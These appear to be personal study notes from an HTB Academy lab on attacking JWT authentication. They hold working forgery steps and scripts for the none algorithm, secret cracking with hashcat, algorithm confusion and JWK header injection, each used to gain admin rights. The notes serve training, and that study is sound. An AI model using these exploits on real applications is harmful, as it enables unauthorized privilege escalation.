# Attacking Authentication Mechanisms

[JWT Debugger](https://jwt.lannysport.net/)

## JSON Web Token (JWT)

**Example**

```json
// header
{
  "alg": "HS256", // signature or MAC algorithm used
  "typ": "JWT"
}

// payload
{
  "iss": "HTB-Academy",
  "user": "admin",
  "isAdmin": true
}

// signature is computed based on the JWT's header, payload, and a secret signing key

// final format is header.payload.signature:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### Attacking Signature Verification

#### Missing Signature Verification

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
```json
{
  "user": "htb-stdnt",
  "isAdmin": false, // amend to true
  "exp": 1781047597
}
```
- Refresh landing page with with amended token

#### None Algorithm Attack

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
- Amend header to none and payload as required:
```json
{"alg": "none", "typ": "JWT"}
{ 
  "user": "htb-stdnt",
  "isAdmin": true, 
  "exp": 1781047597
}
```
- In [CyberChef](https://gchq.github.io/CyberChef/) set "to base64" and select "URL safe" from the drop down
- Encode header and payload individually and combine separated by `.` and end with and additional `.` (no signature):
`eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyAKICAidXNlciI6ICJodGItc3RkbnQiLAogICJpc0FkbWluIjogdHJ1ZSwgCiAgImV4cCI6IDE3ODEwNDc1OTcKfQ.`
- Refresh landing page with with amended token

### Attacking the Signing Secret

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
- Inspect the alg value (HS256, HS384, and HS512 have potentially guessable secrets)
```bash
# Save the token to file
echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTA1MjEzNH0.MSgFA_10UjXxJ094b7RALYn7k35SmlY4fTweVHgibC4 > jwt.txt 

# 16500 is hashcats mode for JWTs
hashcat -m 16500 jwt.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt

# reshow cracked secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --show
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTA1MjEzNH0.MSgFA_10UjXxJ094b7RALYn7k35SmlY4fTweVHgibC4:rayoleos
```
- Back on [JWT Debugger](https://jwt.lannysport.net/) amend payload as required and add signing secret
- Refresh landing page with with amended token

### Algorithm Confusion

**NOTE**
Works if the web application uses the algorithm specified in the alg-claim of the JWT to determine the algorithm for signature verification

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
- Confirm alg value is an asymmetric algorithm (RS256)
- Access the public key used by the web application for signature verification:
```bash
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n

# Generate two different JWTs signed with the same public key using burp repeater and pass them as args
python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc5MH0.TaKlletu_olhBl_fxXyiRhqc2T9P4jruXLdqLzIPpU_9mE_njizz9_qslJb_dPZT-ymbvUKmrHvrQM1T6TQR3vDXiXtljBhgtINan_CxCEsbKUaZxcIGmK_DJkl5eNBQla0DO8HpN55AAIoskjysIG2pooYuXhA319cvMVDc4evhpnWaR3Fw8N8_mr-tTmw4_gt6YU21LQwHtUQXWlSPoxbE07wTJD16c63EO9GmcMAobSlWU0PTeGxwydpIP82B7nBC2j4Hu1R-2MWupZoxoo07AYgAZdZiwgdWSDYb5KFNCKRKqnefH4j8OASV0rXIIujN13YC0uUX6Kxm4QamKQ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc3NH0.Ohtmgwts_GmeNm2-dD03-KEGBF7gj-GYUIkQRB0Jz4KK872TGGYPJ4boaA6ttyfsdHRvpakzP3L4soBWblO3INEiyAJ1iY1tO0VkhiJQtpQFcJXoMaunXfDJvonUf-o0r9j9kATXCMDu-ILq_QK3k-Txevvp3FG8FMuJ3tmV6zRjdaNKbF14WrJt0K3PvCRTzDXSmlHd91GSXDcO9PK42Y-FpUzc82H8mNSUHQI8EAAvLtEAqqbeV--s4C_FYcnZjkQxqWSE38BRVVFVBhHOtbt-fvtXVILKUqxVEh6CIoX6pZuWfKf5GewMfQTVui1NRwigUVFemqe3Uf8ADUn20w

# multiple results returned:
[+] Written to b1969268f0e66b1c_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs'
[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.gzm7wCp4TP4xvsxw-hF23cbCNEGhVtWsFNj3yopYgqk'
```
- Back on [JWT Debugger](https://jwt.lannysport.net/) past the generated JWT to confirm that it indeed uses a symmetric signature algorithm (HS256)
- Send the generated JWTs as session token to landing page request to conifirm which one is accepted and that app is vulnerable to algorithm confusion
```bash

# Forge the JWT using the working JWT and the corresponding .pem file, changing isAdmin to true
cat > forge_admin.py << 'EOF'
import base64
import hmac
import hashlib
import json

# === WORKING TOKEN FROM jwt_forgery.py ===
working_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs"

# Split
header_b64, payload_b64, _ = working_token.split('.')

# New payload
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode())
payload["isAdmin"] = True

new_payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(",", ":")).encode()
).rstrip(b'=').decode()

# Use the corresponding pem key that worked
with open("b1969268f0e66b1c_65537_x509.pem", "rb") as f:
    key = f.read().strip()

# Sign
signing_input = f"{header_b64}.{new_payload_b64}".encode()
signature = hmac.new(key, signing_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

print("=== ADMIN TOKEN ===")
print(f"{header_b64}.{new_payload_b64}.{sig_b64}")
print("===================")
EOF

# run the script
python3 forge_admin.py
```
- Copy the newly generated token and resend the landing page request with this token

### Other JWT Attacks

- Signing secret reuse (try using one to sign another)
- Attack the JWK header (replace with a public key we generated)
- Attack the JKU (same as attacking JWK except the header has url which points to a server hosting the public key)
- JKU claim may be vulnerable to blind GET-based SSRF attacks
- x5c and x5u claims (similar to JWK and JKU but based on the certificate/certificate chain)
- kid claim can lead to many attacks (including path traversal, SQL injection, command injection)
- [RFC for JWK headers](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1) 


#### Attacking the JKU

```bash
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
vim exploit.py
```
```py
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```
```bash
python3 -m venv .venv
source .venv/bin/activate
pip3 install pyjwt cryptography python-jose
python3 exploit.py
# resend landing page request with generated JWT
```

### jwt_tool

```bash
# install
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt
python3 jwt_tool/jwt_tool.py -h

# analyse token
python3 jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0

# create a token that uses none alg and updates payload
python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
```

## OAuth

